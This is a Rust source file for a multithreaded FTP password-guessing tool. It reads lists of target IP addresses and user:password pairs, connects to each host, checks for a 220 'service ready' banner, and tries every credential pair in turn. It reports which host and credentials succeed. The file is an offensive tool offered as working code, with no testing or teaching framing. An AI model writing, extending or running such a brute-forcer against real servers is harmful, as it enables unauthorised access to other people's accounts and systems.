mod address;
mod constants;

use address::Address;
use clap::Parser;
use constants::MAX_MESSAGE_SIZE;
use std::{fs::read_to_string, io::Read, net::TcpStream, path::Path, sync::mpsc, vec::Vec,sync::mpsc::{Sender, Receiver}, time::Instant};

use threadpool::ThreadPool;
use std::sync::{Arc, Mutex};

#[derive(Parser, Debug)]
struct Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    hosts: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

fn main() -> std::io::Result<()> {
    let args = Args::parse();
    let host_list: Vec<String> = read_file_lines(&args.hosts);
    println!("Found {:?} Host(s)", host_list.len());
    let credential_list: Vec<String> = read_file_lines(&args.credentials);
    println!("Found {:?} Credential(s)", credential_list.len());
    let mut finished = Arc::new(Mutex::new(Vec::<Address>::new()));
    // TODO make into a generator (generators are not stable yet)
    // for host in &host_list {
    //     addresses.push(Address::new(host))
    // }
    println!("Starting...");
    let now = Instant::now();
    let pool = ThreadPool::new(4);
    let (tx, rx): (Sender<Address>, Receiver<Address>) = mpsc::channel();
    let mut buffer = [0; MAX_MESSAGE_SIZE];
    // let arc = Arc::new(Mutex::new(&addresses));
    for host in &host_list {
        let host = host.clone();
        let credential_list = credential_list.clone();
        let tx = tx.clone();
        pool.execute(move || {
            let mut addr = Address::new(&host);
            let mut stream = TcpStream::connect(addr.get_host()).unwrap();
            stream.read(&mut buffer).unwrap();
            // read welcome message and make sure the code is 220 (Service ready for new user)
                // TODO retry later if not.
                if buffer[..3] == [50, 50, 48] {
                    for passwd in &credential_list {
                        let iter: Vec<&str> = passwd.split(':').collect();
                        addr.attempt(iter[0], iter[1], &mut stream).unwrap();
                        if addr.is_successful() {
                            println!(
                                "Success on {:?} with credentials {:?}. Total attempts: {:?}",
                                addr.get_host(),
                                addr.get_successful_credentials().unwrap(),
                                addr.attempts()
                            );
                            break;
                        }
                    }
                } else {
                    println!(
                        "It appears that {:?} is not ready for new connections",
                        addr.get_host()
                    );
                }
        })
    }
    pool.join();
    println!("Total time elapsed: {}", now.elapsed().as_millis());
    Ok(())
}

fn read_file_lines(file_name: &str) -> Vec<String> {
    let file_exists = Path::new(&file_name).is_file();
    if !file_exists {
        panic!("{}", format!("File {} does not exist!", file_name))
    }
    let contents = read_to_string(&file_name)
        .unwrap_or_else(|_| panic!("Error reading from file {}", file_name));
    return contents.lines().map(|line| line.to_string()).collect();
}
